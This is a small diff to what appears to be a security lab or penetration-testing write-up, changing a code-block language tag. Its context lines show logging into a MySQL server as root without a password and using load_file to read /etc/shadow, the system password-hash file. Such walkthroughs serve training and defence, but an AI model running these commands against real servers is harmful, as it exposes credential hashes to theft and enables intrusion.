@@ -293,7 +293,7 @@ exploit
 mysql -h 192.49.51.3 -u root
 ```
 
-```mysql
+```bash
 MySQL [(none)]> select load_file("/etc/shadow");
 # /etc/shadow is readable
 ```
